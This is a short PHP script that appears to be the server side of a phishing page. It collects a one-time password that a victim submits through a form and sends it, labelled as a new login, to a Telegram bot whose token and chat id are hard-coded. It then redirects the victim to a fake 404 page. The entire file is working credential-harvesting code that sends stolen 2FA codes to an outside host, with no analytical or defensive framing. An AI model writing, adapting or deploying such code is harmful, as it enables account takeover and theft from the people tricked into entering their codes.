<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve the form data
    $otp= $_POST["otp"];
    

    // Send data to Telegram
    $telegramBotToken = '6978848955:AAFZ-QvMhqwB2cfDoX6S-B9AfpWsss4XGlM';
    $chatId = '6311691587';
    $message = "New Login\notp: $otp";

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramApiUrl .= "?chat_id=$chatId&text=" . urlencode($message);

    // Use cURL to send a POST request to Telegram
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);

    if ($response === false) {
        // cURL request failed
        echo "Error sending message to Telegram: " . curl_error($ch);
    } else {
        // Check Telegram API response for any errors
        $telegramData = json_decode($response, true);

        if (!$telegramData || !$telegramData["ok"]) {
            echo "Error from Telegram API: " . $telegramData["description"];
        } else {
            // Redirect to the 2fa.html page
            header("Location: 404/404/index.html");
            exit();
        }
    }

    curl_close($ch);
}
?>
	